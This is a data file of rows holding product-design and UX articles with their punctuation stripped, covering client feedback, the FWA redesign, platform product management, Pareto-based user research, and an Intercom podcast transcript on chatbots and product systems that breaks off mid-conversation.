82,product,Designers share the worst client feedback they ve ever gottenAll designers understand that client feedback is an essential part of the design process  It can be challenging  however  not to take offense when your creations are criticized  Client feedback is often constructive  but sometimes you receive feedback so bad you can t help but laugh  let alone take it personally   We recently asked the InVision community to anonymously share the worst piece of client feedback they ve ever received  and  oh boy  you re in for a good chuckle  Here are our 10 favorite submissions  illustrated   What s the worst feedback you ve ever gotten   Tell us about it on Twitter   InVisionApp 
83,product,Reimagining one of the largest online award platformsLaunched in 2000  The Favourite Website Awards  FWA  recognizes cutting edge technology and creativity  It s one of the largest online award platforms   A year ago  though  our team realized that the FWA website wasn t up to par with the innovative projects it awarded  What follows is the story of our year long redesign   The beginning  Content audit  Content audits are always important  but for this project it was essential  We needed to understand the 15 years of data that we d be migrating so that we could write a script that would properly take care of it   The audit showed us the different types of content on the platform  along with the frequency of content updates  As an example  we could conclude that there were a few daily awards  a monthly and a yearly award  etc  Editorial pieces like interviews  agency spotlights  and jobs were less predictable in terms of frequency  so we calculated the average frequency for these  Looking at all this told us how big the project really was   In addition to the content audit  our founder  Rob Ford  wrote to industry leading creatives to gather input about how they used the platform and which changes they d like to see  One thing we learned was that the community wanted the editorial content to be more prominent it was too hidden on the current platform  But more importantly  the community wanted a responsive and fast performing platform   Once we had all this info  it was time to put the team together  The back end was too massive and complex to do in house  so we invited Konform to collaborate on the project  They do complex yet fast systems  so we knew they d be a good partner to build the back end  The FWA platform was getting old and slow  so performance was key to the success of the project   The approach  Evolution or revolution  We discussed this topic over and over again  We wanted to stay true to the long legacy and brand equity the FWA had built over the years  But we also knew that the revamp required brand new thinking   So we did both  From a visual standpoint  we decided to work with the existing identity elements and focus on pushing the concept instead   Live judging was the biggest conceptual change  In the past  users didn t know if they were close to winning  It was a  black box  with an unknown outcome  The new system was transparent  The judges  approximately 100 women and 100 men  cast their votes  and the submissions that get the highest score over time automatically win   Old FWA submissions were much smaller in size than they are today  We solved this by creating special templates with higher pixel density in same aspect ratio as the old submissions  This way old and new content could work in the same grid  We also created 6 breakpoints to optimize the experience on various devices   Another thing we had to take into consideration was the question about what a digital creation is  In the early years  the FWA awarded sites  but it felt antiquated to only focus on sites when the digital world was blooming with installations  experiments  apps  and virtual reality  It was evident that we had to move away from the legendary Site of the Day  SOTD  and replace it with something else  The only issue was that people identified the FWA with SOTD it d be like changing the Oscar to the Oswald   Here s some of the examples of input we got   Community member 1   FWA equals SOTD and SOTD has always been the main reason to swing by on a daily basis    Community member 2   I think it s amazing how the FWA is renewing itself to be the representative of all media creations staying up and ahead of the times  One thought I had is that maybe the site of the day should be renamed to creative of the day  Or something broader than site    Community member 3   Call me old fashioned  but I d like you to keep the SOTDs  It s what all of us in the community always have been striving to win    We had to make a decision  Even though we understood both sides of the argument  we decided to build for the future and rename it to FOTD  FWA of the Day   In other words  any digital creation could be awarded on a daily basis   Prototyping  We built more than 50 prototypes to help us test key functionality on the platform  Some were simple clickable wireframes  while others were fully developed prototypes with real data  We needed a real jury to test the live judging  so we reached out to people at the 25 most awarded agencies  We then set up a testing environment  The feedback we received from that enabled us to optimize the judging flow   Tools  We decided to use Basecamp for this project mainly because we were 3 teams that had to be in perfect sync  Never play telephone on a project   Even though it s great to have one point of contact for a client  there s too much interpretation happening when one team is an intermediate  In Basecamp  everybody sees all discussions  tasks  files  etc  Here s an example of what it looked like halfway through the project  We had a total of 102 discussions from June  2015 to June  2016 when the platform launched   Halfway through we also did a mid term evaluation  Here are some of the main questions we asked ourselves   How is the project going   What is working   not working in the process   What do we think needs to improve   What can I do to make the project great for my team members and myself   This process was exceptionally smooth  We believe it s because we were a tight group with few stakeholders and a high level of trust  We use a method called  stop  start  continue  to ensure that the team dynamic is always good  Team members say what they d like the other members to stop  start  and continue to do on the project   This is one of the first projects where we tested InVision  We used it to to present UX and UI  collect feedback  and to test out device specific features  It proved to be extremely useful because we got detailed feedback in the context of a specific screen  This way we could iterate and update the specific screen without having to do a new presentation every time  It also enabled us to do clickable wireframes  which eliminated the typical errors and interpretation issues that come with static  annotated wires  We were making it instead of explaining it   JIRA has been our bug tracking tool for a long time it gets the job done  We spent a considerable amount of time in JIRA  1000  tickets    Takeaways  When you design a big platform  you need to take out the guesswork  Preparation is key  and it was a major advantage that we had qualitative input from the community  We believe this is a major reason why there was less than 1  negative comments when we launched  Part of the preparation is also to align expectations and make detailed tech specs   Platforms are complex  and you re only halfway there when the design is completed  Even though it s fun to start over  we chose to embrace the FWA legacy  extend it  and make it better   We learned that you should never underestimate the blood  sweat  and tears it takes to do good QA  This is when you realize that you thought you took all scenarios into account  but you didn t   How do we handle a situation where 3 judges have to vote in 3 different time zones around midnight when the next FOTD has to be awarded   Oh crap we forgot that one  Always remember to design for worst case scenarios   Finally  team up with people who are better than you  We owe a huge thanks to Konform for making a very complex back end process smooth  Moving 15 years of content is hard technical work  and they helped us steer this project to safe harbor   Read more from our Design teardown series
84,product,UX designers don t have the best ideasAlone  UX designers don t have the best product ideas   Sure  after doing user research  chatting with stakeholders  and throwing in some requirements  UX designers can typically bust out a cool feature on their first try  But that s not our job   It s just not possible for one person to have every single answer for how something should look and function  By ourselves  we don t have the best ideas   Our job is to create the best product ideas by including a diverse set of people from our company in the feedback loop   Related  UX design trends for 2017  Everyone has great ideas  which is why you should never talk to the same people over and over again  That d be like mixing vanilla ice cream with vanilla ice cream  don t get me wrong I love vanilla ice cream   Instead  throw some Oreos or even French fries into your vanilla ice cream by talking to account managers  sales people  back end engineers  customer service reps  and anyone else related to the product that you normally wouldn t talk to   When you talk to people from different parts of your company  you ll hear different perspectives  different priorities  different needs and they won t have the same constraints that you do  Hearing their feedback might give you that out of the box solution    Individuals and teams that bring diverse experiences and different backgrounds to a field can sometimes be more successful in identifying needs and opportunities because they are more willing to question the status quo     Biodesign  The Process of Innovating Medical Technologies  How to involve everyone at your company in UX conversations  Talk to them like you would talk to a product manager or even a user  Start a conversation by asking   What would you want if you were someone needing to do XYZ   Many people will ask you more questions so they can get a better understanding of the situation to give you their best suggestion  Then just sit back and listen   The goal isn t to get the silver bullet it s to come up with more options   There are also countless other ways to get ideas from your atypical users  You can do a modified design sprint based on your resources and bring in others besides the typical engineers  users  product managers and stakeholders  You can run your participants through card sorting  review sales pitches  do contextual interviews  review your products metrics  or even listen to account manager s calls with their customers  I did this once and just hearing them explain things a certain way gave me that much more insight   I already talk to everyone  so what else can I do   Don t be afraid to show other people your explorations  They may not be the user  but your design should be simple enough to work for anyone  Unlike a user or a product manager  the new person will not be numb from looking at the same screen over and over again and will be more likely to give you new feedback that you might have taken for granted    It s really hard to design products by focus groups  A lot of times  people don t know what they want until you show it to them    Steve Jobs  To give you a real example from my work  I was working on a screen for power users  On this screen it shows a lot of information and we need to allow our power users to edit all this information  they needed inline editing    I created 5 concepts that varied from a simple concept to a more aesthetically flushed out concept  I felt like the more flushed out option was best  but I also felt like it was the most complex and would take the most amount of resources   But once I showed these options to my engineers  they said the way I wanted was the easiest  Based on their simple feedback  I was able to build the product that I felt was best for the user  So  by simply getting my engineers  feedback on my mocks  it allowed me to focus on the mocks that worked best for everyone  This feedback decreased the time from deploying an MVP feature to the  finished  feature   What do I do with the feedback   Take every piece of feedback with a grain of salt  The reason is because the people you talk to might be telling you exactly what they want  They might be saying they want one thing when they really need something else   Related  Designers share the worst feedback they ve ever gotten  Also  as you gather more and more feedback  be on the lookout for any high arching trends that can be fixed quickly  Get that low hanging fruit that could be fixed within days that will give some high value   You can also prioritize solutions to the feedback you received  I usually do this based on a combination of what the user needs  the resources you have  your timeframe  and your ROI for each product you build  For example  I might prioritize something that will provide a good amount of user value at a low cost over a feature that will provide a high amount of user value at a high cost   Read more posts about UX design
85,product,Is your project pointless You re currently in one of 2 groups  You re either working on a project that matters or you re not  If you look at the past year  you can trace back most of your success to just a handful of projects  That s out of potentially dozens of individual projects in that timespan   The odds that you re working on something valuable are starting to dwindle   But wait a sec  What s so different about successful projects anyway   Nothing at first  They re indistinguishable  You re equally excited about projects that turn out to be average as you are the ones that have big results  They even feel just as likely to create the outcome you want  or else you wouldn t do them   That means if we re being honest  by definition  most of the projects we re considering taking on end up being average   A good example is your content marketing  If you re lucky  you had 3 or 4 blog posts blow up last year that generated more traffic than all others combined   So how can you be one of those people who always works on precisely the right thing at the right time   There are a few ways  Experts have even graciously shared their formulas  But the common thread between them is that outlining a great project brief is the first step   As a designer myself  I m ashamed to say I never fully appreciated how hard it is to create a project brief  After all  it s not taught in school  Yet it ends up being a fundamental skill in business   You don t need to be hiring someone or even working with a team to benefit from creating a great project brief  They help even if you re working alone   You just need to ask yourself 3 important questions   1  What are you trying to accomplish   If you have an idea for a project  it means you have a problem you need to solve  Be explicit about what that problem is  What will you be able to do as a result that you couldn t do before  For example  if the project you have in mind is a mobile app  the reason you want to create it might be that you ve noticed a lot of your traffic comes in on a mobile device  but doesn t convert at the same clip as your regular traffic  That tells you  and anyone on your project  a lot more about why your project should exist  than just saying you need a mobile app   2  How will you measure success   Now that you know exactly what you re trying to accomplish  dig deeper  What does success look like  What happens if you create this app  Will you convert 5  more mobile visitors into customers  Is that a meaningful increase in revenue for your business overall  What will you do with this additional revenue  Will you invest it in another area of your business  Where  See  thinking about how you ll know whether or not this project is successful means you re more likely to make it one  You can t hit a target if there isn t one   3  Why move forward with this project now   The last question is about your project at this point in time  Think about whether this is a new problem or an old one  Ask yourself why you didn t do this project 6 months ago  And how this problem has changed or evolved over the last few years  These questions transform your timeline requirement from   We want to launch in 3 months  to  We need to launch in 3 months because that s the start of football season which is when we get a huge spike in traffic   That s a totally different type of deadline   Talk think in problems and goals not solutions  At first  you re going to default to talking about the thing you want to create  That s common  That s normal  That s average  But remember you re not looking for average   That s why instead you ll force yourself to talk about the problems and goals of the thing you want to create  You ll avoid questions that most people focus on like    What do I want to build  or   What s my budget   These things put you into a box that you can t get out of  They force constraints on not just you but the people you work with   They create bad projects   A great project brief breaks out of artificial constraints and re focuses you on the things that really matter   Focusing on problems and goals instead of solutions at the start multiplies your effort when it s time to create a solution  You ll finally be confident you re truly working on the right solution   Want help deciding which of these projects to move forward with  I have a formula for that  Sign up to download the PDF here   This post was originally published on Medium 
86,product,Making the Shift to Platform Product Management   Wyatt Jenkins   MediumMaking the Shift to Platform Product Management  Many startups begin with a great product   something that gets traction in a market  but then stumble trying to make the transition to a platform  This article describes the not often discussed shift in product management philosophy required to be a platform  The use of the word  platform  is defined as a set of technologies that enable products to share data and experiences with one another  An example of this would be moving from a monolithic codebase to a common set of API s or services and you often see in web services or operating systems  In my career I ve been a product leader at three of these companies  some with more success than others  The fact is  platform product management requires a different set of skills than customer facing product management roles and needs a different interview process and career path  This is the article I wish I had ten years ago detailing the changes required for platform product management   A common journey for many startups is moving from a single customer product to multiple products where shared components exist  Another journey is one where the core product becomes so successful that a level of abstraction between the underlying technology and the customer facing product is required to scale  but there s very little written about the shift in the product management organization that drives this   For tech companies who want to scale growth or build new product lines  the question isn t  if  they ll build a technology platform  but  when  because of economies of scale   When you decide to shift to a platform  you need to make an explicit delineation between customer facing product managers  AKA  Solutions Product managers  in SAAS companies  and platform product managers   An example product organization supporting multiple products built on top of a set of shared components  The Job of a platform product manager is to prioritize the work of a component or set of components that are used by multiple consumer facing products and potentially end users as well  Here is a list of traits required to be great at platform product management  Keep in mind that while it s important to have generalist product management skills  without these the platform PM won t be successful   1  Platform product managers understand the big picture   Platform PM s are in charge of creating functionality that spans multiple product lines  These PM s need to understand the large strategic vision well enough to make short and long term trade offs across different products  This PM will sometimes have to make unpopular decisions that hurt the short term revenue of a product line but make all products better over time   2  Platform PM s effectively manage different types of stakeholders   There are three different users that a platform PM builds for  There s the end user   or customers who are using the service that you build  You need to understand dependency trade offs that affect the customer experience  Second  there exists multiple GM s or solutions product managers who are trying to hit a goal with their particular product line and who need features from your team  Finally  there are the developers who are building on top of your service and will present a set of requirements  including working with their favorite frameworks and tools  Here s a great post on these different constituencies   Platform PM s don t just have to understand their customers  but their customer s customers in order to be successful and when they fail  it s often because they ve only thought about the developer persona   3  They create concise long term product roadmaps   I m a fan of keeping consumer facing roadmaps light so that teams can pivot quickly to meet customer demand  However  with Platform product roadmaps  it s important to take a longer term view because you need to set expectations with many different stakeholders  These roadmaps also require a more detailed concise approach so that the technology you build is scalable  reliable and maintainable  The Platform PM will have to answer the question   What if this technology needs to handle 100x the traffic    4  Project management skills are a plus   I m not saying you need a project manager in addition to the Platform PM  rather that the execution skills of great project management such as dependency management  team blockage removal and process health will help a platform team succeed  With longer term roadmaps  complex dependency management and more diverse stakeholders  project management skills are valuable to the team   5  Being technical helps   In some larger product organizations  we would refer to the Platform product manager as  TPM  or Technical product manager  At Amazon or Microsoft they sometimes call it program management  Many platform PM s were former engineers which makes sense because this role is much moreinward facing with the engineering team than outward with customers  When people commonly ask   does a product manager need to be a former engineer to be successful   I d  say it depends  what type of product manager  Generally speaking  no  they don t have to be former engineers and I ve seen world class PM s succeed without an engineering background  However  the need to be technical increases with platform product management more than consumer product management because many of the problems you are solving are traditional computer science problems around scale  maintainability and architectural design  Not to mention one of your core customers on a technology platform is other developers so it helps to have been one   6  Obsess over accurate   concise communication   One of the traits developers love about a  Platform as a service  company like Stripe is a beautiful  simple API  Platform PMs need to obsess over how to communicate what their service does in a way that lets users integrate with it easily   _________________________________________________________________  As the product organization matures to establish platform thinking  the concept of outward  customer or solution  and inward  platform  facing product managers becomes necessary  Outward   Solutions  Product managers are growing the user base  financial metrics and usage  Meanwhile  the platform PM in this situation loves making others successful and sometimes have the  lead from behind  quality exuding enthusiasm when others hit their numbers  Platform PM s are often builders and enjoy being in the weeds with their team  while customer facing solutions PM s are out of the office more than 50  of the time with customers   When shifting to a platform  everyone wants to be a platform   here are a few common pitfalls of platform product management   1  Ivory tower instead of customer centric thinking   When I ve switched to a platform environment  I noticed a change in the way much of the engineering organization thinks about product development away from customer centricity  Prior to building a platform most product teams were fully cross functional  In a cross functional world  our engineers were spending time talking to customers with product managers and designers  Once we switched to a platform model where teams of engineers would own an API  we had entire teams working on good computer science problems  but not speaking to any customers for months on end  In the worst cases  we had teams of developers over architecting a solution that customers didn t really need in the first place  Customer empathy is something the platform PM needs to find ways to generate  Too often a platform team believes that if they provide value to internal stakeholders or other developers  it s good enough  But it s the combination of customer needs  stakeholder needs and developer needs that make for a great platform  In this sense  the voice of the customer becomes even more imperative for a platform PM   2  Product organizations require strong architectural leadership partnership   The desire to be a platform is great  having the architectural leadership in place to execute on this is very different  I won t go into the definition of a great software architect  but having a few pragmatic  thoughtful architects in your org to avoid complexity and lead conversations with PM s and software developers is a necessity  because they truly understand what s possible  The architecture team must have a holistic view of the entire system in mind when they help the PM make decisions  Great Platform PM s know to engage the architects early and often in researching new development   3  Investing in a platform too soon   Building a new product is fraught with ambiguity  the need to respond quickly to customers  pivoting  prototyping  hacking and doing whatever it takes to find product market fit  This is not the time to start building out the platform underneath the product  My recommendation is to give the product time to find sustainable growth before investing in the underlying platform  Trying to build the platform at the same time as another PM is trying to find product market fit will slow the customer facing product down  reduce your likelihood of success and frustrate all who are involved   _________________________________________________________________  The world is littered with thousands of companies who made it past their first successful product  but were unable to transition to a platform or launch a successful second act  There s great content on the web detailing product management of shiny new products   features using MVP   prototyping to get ideas off the ground  but very little on making the shift to scalable infrastructure that s built to systematically launch new products and grow your business  Understanding how platform product management will change your product organization and your company can be the difference between an organization that s built to last and a one trick pony 
87,product,Designers shouldn t code  They should study business Designers shouldn t code  They should study business   Increasingly  more and more companies are looking for great design leadership these days  They are being told that their company needs a bigger focus on design thinking and are keen to adopt more design centric principles  But over and over  when these companies talk to designers  they hear about craftsmanship about brand consistency  and polished design  designers who can code  and style guides  and prototyping  and testing   the designer s craft   All of those things are good   mandatory even  But for us to truly understand the best way to help a business we have to start focusing on what makes the business successful  We must first understand business in general  Then we will better understand where craft is important  and where it is excessive    Instead  designers are often seen as someone that needs to have the important business goals explained to them in the most basic of ways  I think our suggestions about design would carry a lot more weight if we were able to have insightful conversations  and offer valuable suggestions about core business principles   Where we are now  There are a lot of designers out there that are starting to think seriously about how their decisions impact their companies  In general  our focus on user research and analytics has helped a ton in giving more credence to the voices of designers  We re also seeing great examples of design led companies and designers impacting the core of big businesses like Airbnb  Pocket  Facebook  Google  Slack  and a loads of others   I would argue that those companies are as successful as they are because they have designers that are focusing more on what those businesses need than on how perfect every pixel is going to look   Shifting our focus  So how do we start thinking about design s impact on business   Maybe its going all out and getting an MBA   All of the designers I know that have done this are actively contributing to the core of their business   But maybe it s even more simple  Maybe its talking to the sales team to understand what the market looks like  Maybe it s talking to shipping and fulfillment to understand why orders are always a day late  Maybe it s reading over the Q1 projections and finding out that the key initiatives for the quarter have nothing to do with refactoring your CSS  Maybe it s taking a night class in economics  Or maybe it s just spending the night googling how fund raising and cap tables work instead of how to use the newest sketch plugin   Maybe we should be spending our time learning about business principles   how to choose business models  how to manage teams  how to conduct competitive analysis  how to make projections  etc   Maybe we should try to learn about the issues a CEO or VP faces and try to use design to help them solve their problems  Maybe we should try to figure out what keeps them up at night and help them solve their problems   instead of ours   The future  I m not saying we should start shipping poorly designed experiences  We have to keep growing and focusing on craft  If we don t  nobody else will  But let s also start understanding the businesses we work for and what they need in order to grow  If we re able to do that  we will continue to gain more influence  and continue to create products that are more impactful both for our companies and for the people that use them 
88,product,Pareto Principle based user researchA few years ago I stumbled across an amazing blog post on MeasuringUsability com by Jeff Sauro  and had an epiphany  He had outlined the way he was conducting Pareto Principle based user research  and I realized that I could modify what he was doing to obtain data that my organization had been struggling to uncover   What is the Pareto Principle   In Richard Koch s book The 80 20 Principle  The Secret of Achieving More with Less  he details how in 1897  a brilliant researcher named Vilfredo Pareto discovered that the majority of the wealth in England and other countries was predictably controlled by a small minority of the population  Pareto s research is also known as the 80 20 rule and the Law of the Vital Few  among other names   In the early 1900s  Joseph M  Juran discovered Pareto s research and realized that the concept also applied to tons of other situations in life  a tiny percent of criminals caused most of the crime  a small percentage of dangerous processes caused a majority of accidents  etc   He also realized that the concept could be applied to improve consumer and industrial goods  He created a consulting service to work with companies to identify top areas they could improve upon to make the most impact with product enhancements   Linking the Pareto Principle to user research  By applying the Pareto Principle to user research  you can identify the top percentage of your product s usability issues and feature gaps  then jump in and fix them   Imagine if you could make a tiny code change and vastly improve your product UX  Oftentimes  you can   In my case  the principle was startlingly accurate  Our research showed that 18  of our core product areas were causing 83  of our clients  frustrations   Would a statistician or professional researcher cringe and shed some tears if they saw the method and data I m about to show you  Absolutely  We aren t even calculating standard deviations here  But does the average stakeholder care about that  Nope   This method is for those who don t have a background in research or statistics  or for experienced professionals who just need some quick and dirty data  It s a powerful  fast  and cheap way to quickly evaluate how you can pack the most UX punch when you re planning improvements to your product or service   Enough talking let s start doing  I m going to outline all of the steps you ll need to take to replicate this research for your organization   The research process  Step 1  Recruit research subjects  Do you have a list of your users  Email them and ask if they d be interested in joining a  special community of customers who will have the opportunity to impact future changes to the product   You don t have to pay research subjects just being able to leave their fingerprint on the product is often more than enough motivation to get people involved in the research process   In this case study  we didn t pay our subjects a dime  They were all excited to be part of the community  and they gave us candid  brutally honest feedback   Step 2  Create your survey  Making a survey is inexpensive possibly even free with Google Forms  or a tool like Survey Monkey   You re going to ask exactly 2 questions in your survey   If you could change one aspect of our product  what would you change   Provide a list of all core content areas and allow only one selection  Do not include an other option   How would you change it  and why would you make that change   Make this question open ended    Step 3  Launch your survey  To launch your survey  you can use a plain old email list  or you can get a free subscription to a service like MailChimp   I prefer MailChimp and here s why   Intuitive dashboard  Great for tracking open rates  click rates  and other fun stats  Easily create lists and groups  Simple campaign templates  Unsubscribe spam rules are handled for you  Step 4  Analyze your data  After you launch your survey campaign  you ll be flooded with responses and data  Don t get overwhelmed analyzing the data isn t that intense   You ll start by calculating the total responses per core product area   Part 1  Calculate totals  Export your survey data to a spreadsheet Sort it by core product area  the ones in your multiple choice question  Calculate totals for how many responses came from each core product area Order them from most to least  In this case study  my results looked like this  out of 40 functional areas    Number of responses  Headlines   26  Editor   21  Files and folders   21  Groups   17  Calendar   12  Reports   8  Other  remaining core functional area aggregate responses    26  Next up you ll determine the percentage of responses per core product area divided by the total number of responses   Part 2  Calculate product area percentages  Now look at the total number of respondents and do some quick math   Let s say I had 152 respondents total   Take the total responses for each key area  and divide it by the overall number of respondents to get the percentage of respondents who identified each key area   In this case study  my results looked like this   Headlines   26 152    17    Editor   21 152    14    Files and folders   21 152    14    Forms and surveys   21 152    14    Groups   17 152    11    Calendar   12 152    8    Reports   8 152    5    Remaining 33 areas total   26 152    17    Using this information I was able to gather some very useful data   83  of the 152 responses fell into 7 key functional areas  and 17  fell into other functional areas   The 7 key areas identified make up 18  of the 40 key functional areas   7 40   18  rounded    Therefore  18  of our key functional areas were causing 83  of our clients  frustrations  So  my results wound up being really close to 80 20  The areas the research identified were shocking we were expecting completely different results  We acted on these results and ran the study the following year  and the areas we d adjusted were knocked out of the list of issues  and we wound up with another set of data with new areas identified that aligned with the 80 20 rule  We adjusted those and replicated the study a third year in a row  and once again  we wound up with similar results  Our team  myself included  was pretty astounded by the consistency of the results year after year   Step 5  Create a report  Now the fun part  Weaving the data into a simple  skim able report for stakeholders   In my instance  I started the report with an overview of the Pareto Principle in 2 sentences  then mentioned that this study broke down to 83  of reported issues stemming from 18  of our core product areas   Next I gave them the high level stats for the 7 areas of concern   Headlines 17  Editor 14  Files and folders 14  Forms and surveys 14  Groups 11  Calendar 8  Reports 5   Finally  I grouped the detailed user feedback by functional area  For example  I gave a heading of  Headlines  and then provided a bulleted list of all of the detailed feedback customers gave in response to the open ended feedback question   It made a neat package that my stakeholders loved  At a glance they could see the big picture  but if they wanted to dive deep into individual pieces of feedback  they could   These research findings made a big impact on decisions that guided our annual product roadmap planning  We were able to identify usability issues  areas that needed UX love  and even product gaps based on the research findings  Then we followed up with our customer base to conduct additional user research in person and through phone interviews to verify the results and dig deeper to make sure we were solving the right problems   Why should your organization take advantage of this research style   Pareto Principle based user research gives you a clear view of really powerful data  your clients get excited about participating in product research and feel that they re really being heard  and the method is simple  cheap  and effective   It s a great research method that can be done by professional researchers and novices alike   If you give a Pareto Principle based user research study a shot  I d love to hear about your experience and your results  Hit me up on Twitter and let me know how things go   This article was originally published in UX Magazine 
89,product,Talking trends in product with Intercom s Paul Adams and Emmet ConnollyAs we turn the page to 2017  we ve been thinking a lot about the buzzwords and trends of the past year  Things like chatbots  voice UI  conversational commerce  machine learning  moving from screens to systems   all were discussed and debated anywhere and everywhere  including our own blog  We at Intercom also had a handful of massive launches in 2016  including Smart Campaigns  a new Messenger and Educate  our knowledge base product  and that has us reflecting on a year s worth of lessons learned  To make sense of the past year and dig into where product and design are headed next  I hosted a roundtable discussion with Paul Adams  our VP of Product  and Emmet Connolly  our Director of Product Design  If you like what you hear  check out more episodes of our podcast  You can subscribe on iTunes or grab the RSS feed  What follows is a lightly edited transcript of the interview  but if you re short on time  here are five key takeaways  Given today s technology  chatbots are best left to handling computation  Things that require empathy or emotion  on the other hand  are still better handled by a human  From Airbnb s launch of Trips to Instagram s addition of Stories  products built as systems rather than a set of screens became more prevalent in the past year  As new uses are demanded for your product  your system will have to expand  Breakthrough products target existing behaviors  rather than asking users to break from the norm  2016 featured two prime examples of the former  Snapchat Spectacles and Tesla s solar tiles  Product teams must make a philosophical shift after they launch a product  As the team enters iteration  every previous decision is back on the table  Defining conversational commerce as sending texts to a bot is simply too narrow  Product builders must expand that view and look at their product as an ecosystem with many endpoints   and messaging is just one of them  Des Traynor  Today I m lucky to be joined by Paul Adams  our VP of Product  and Emmet Connolly  our Director of Product Design  2016 was marked in a lot of ways by bots  We had our own opinions  and we had our own experiments  as did the entire industry  Is the future of product design really gonna sit inside a chat bubble  Paul Adams  Both Emmet and I wrote a lot of blog posts about bots over the year  and we built a lot of bots too  Some of them saw the light of day  some didn t  We learned that bots are overhyped  For very human things like empathy and emotion  bots are terrible  What we didn t realize is that bots do work for a very specific set of use cases that are probably narrower than people first imagined  There was a crazy AI vision of the future  where bots are as intelligent as humans  and our biggest realization was that bots are good at some things  and humans are good at other things  Bots are really good at computation  Bots are basically simple computers  so if you need to ask somebody what your next bill was gonna be  a bot can calculate that far faster than a human  who d have to look up the system  find your account  look at the UI and find the number  For very human things like empathy  emotion and reading between the lines of what someone s actually trying to say  bots are terrible at that  given today s technology  Des  Emmet  from a design perspective  it sounds like you d have to spend half your time dealing with whether or not the bot knows the answer  In the majority of cases the bot s probably not going do a good job  right  Emmet Connolly  We have a system whereby a human or a bot could answer your question  and so it becomes more of a rooting problem than a problem of   What do I do in this failure case where the bot doesn t know the answer   If the bot doesn t know an answer  or can t provide a great one  then the human should provide the answer   Paul and Emmet s teams designed Educate  Intercom s new knowledge base product  for bots to supplement a human customer support where appropriate  A lot of the pitfalls we saw this year were use cases where people building these bots were over promising what they could deliver  The technology for an English language level conversation really isn t there yet  and that has plunged us into this trough of disillusionment  That s also a good place to be  because it means that we re getting real about what s actually possible  If 2016 was the year of hype around this  we could actually see a lot of real life  useful tools and products emerge in the next year  Des  It s really convenient  the way these things pick whole years in which they re going to experience these iterations  We see bots that pretend to be humans  like   Hi  I m Barry the airline bot  how can I book you a flight   And then you see bots that are blatantly bots  like   I m the little operator bot  and I m going to point you in the right direction   You said the idea of trying to humanize these bots isn t something that we want to do at Intercom  but what s the general thinking there  The degree to which you personify the bot evokes a very different reaction in the end user  Emmet  Our thinking has actually evolved a lot as we ve tried out a lot of the experiments that Paul mentioned  Initially the thing that seemed most obvious to me was   Hey  these are friendly little robots that can interact in your conversation  Let s make them be tiny Pixar characters   That s not what resonated with the users that we put our early bot iterations in front of  The nuance of tweaking a little bit of the language or the degree to which you personify the bot evokes a very different reaction in the end user  Some of our early experiments had people saying   Hey  I m  bot name   I m not a real person  but I have a character   People didn t like that at all  because hey felt slightly duped by it  They thought they were here to talk to a person  If you can insert a level of automation and   Hey  I am an automated bot that s here to speed up the process   then people can see the value in that  and it doesn t feel like a bit of a bait and switch  Des  We had a command line once upon a time   Write in the exact word and you ll get the exact answer   Do you think people s behavior changes when they know they re talking to a bot  Do they still continue the formalities and the civility and the   Hey  I m curious about    or is it just like   Flights please   Paul  For me  this thing is a scale  At one end of the scale is a command line interface  where it s clear that you re talking to a computer  People don t actually  in many cases  turn around and ask themselves   What is a bot   There s no actual common definition  We  in one of our blog posts  said that a bot is a simple computer program that executes  and then to Emmet s point  you can give it a face  you can give it a name  and you can make it more or less human like  If the command line interface is one end of the scale  at the opposite end is what Facebook was trying to do  whereby you didn t know if you re talking to a person or a bot  and clearly there somewhere is the uncanny valley  We didn t get close to the uncanny valley  We were far down the path of this is clearly a computer program  The minute it started pretending it was anything other than a computer  people reacted very negatively to it   Bots are most effective today when users know exactly what they re interacting with  Des  So it comes down to honesty and transparency  Emmet  Partially  I also think part of the 2016 exuberance from bots was around this sense of   Check out this very simple use case that I made up  screen shot  and put in my blog post   and people with a sense for product said   Wow  that does seem like a real new simple way of doing things   Then when you try and actually build these things  you realize that typing human  English language sentences to a robot isn t how you want to interact with a robot  If you give people a blank input field  it leaves a lot of room for the person to be rude to the robot or type pseudo commands or friendly questions to them  There s an evolution of the input on the end user s side that isn t quite so English language based  Maybe some of that standardizes around how you might be given a set of pre canned responses that you can send to the bot  which is faster than typing a whole sentence  It s easier because you actually know what you can say to the bot  which is another problem these blank input fields provide  If I m right about that  it s possible that that question of   What should your tone be when interacting with a bot   would go away  Des  If you follow that thread all the way  it s hard to see how that doesn t start to look like buttons that you click  It starts to look like UI  Emmet  The most salient characteristic of conversational UI is not necessarily that you re typing raw text in at the bottom of the screen  it s that you have this back and forth log of commands  It goes back and forth  and there s more ways of sending a command to the computer than typing it into the input field at the bottom  Des  And maybe there s not a predetermined order the command should be received in  and they would be in a form or something similar  Paul  Right  and to play at both sides there  there s also more ways than having this nice grid layout on a screen  with a left hand nav and a button at the bottom  and all the other common ways in which we ve come to expect products to work  The rise of systems Des  Paul  you spoke a lot this year about the idea that products should be thought of as systems rather than just a set of screens  How has that played out a lot in 2016  Have you seen a lot of new systems emerge  Paul  Most people building software are actually building and designing systems already   they just may not necessarily realize it  Systems are these broad networks of things that are related and connected  Uber is a simple example  Uber is certainly not a software company and certainly not an app company  Uber is this ecosystem of drivers  passengers  inventory  all sorts of things  Over time as that system emerged and evolved  Uber added things like surge pricing  Other parts of the system like price and availability and even where people drive   the whole thing changes  You change one piece of the system  and other the pieces of the system change  One example from this year that I use is Nike   Their app was totally redesigned this year  It used to be called Nike  Running  The redesign is now called Nike  Run Club  That s a sort of branding distinction  It s like   Oh  it s a club  There s other people  Oh  it s a system  All right  There are connected things happening in here   If you go into the Nike  Run Club app now  you can go on runs  track your mileage  all the normal stuff that running apps have  But they ve paid a lot more attention to the system of runners   runs with other people  meetups in different cities  your running shoes  Nike  had a lot of these components but they ve certainly doubled down on an idea that this is actually a broad ecosystem far beyond the app  The app is a conduit to other things happening in real life   Des  What about from the design perspective  Emmet  Have you seen any new things emerge in this regard  Emmet  Airbnb went through a similar transformation this year  The objects or actors in that system used to be things like guests and hosts and housing accommodation  Now they ve added Trips  very much broadening their scope  One would assume they ve had to evolve their underlying system to cater for these new things that they ve added  That suggests to me that the system will tend to expand as new uses are demanded  If you looked at the Instagram app earlier this year  the big button in the bottom middle would open your camera and you would post that to your stream  Now they ve added Stories and almost flipped what they re about  Now the button at the bottom is to upload a photo you ve taken before  That s your curated feed  Honestly  it s probably what Instagram was always about  Snapchat is the possibly unfair  hard to avoid comparison when you look at how Instagram has evolved their system  Snapchat in itself is an interesting example  because they came from a very chaotic place earlier in the year and they seem to be rationalizing a lot of concepts  You could say that Instagram and Snapchat are meeting in the middle having come from very opposite places  Targeting existing behaviors Des  Instagram started with a very clean system  It was very obvious you had your own stream and other people s 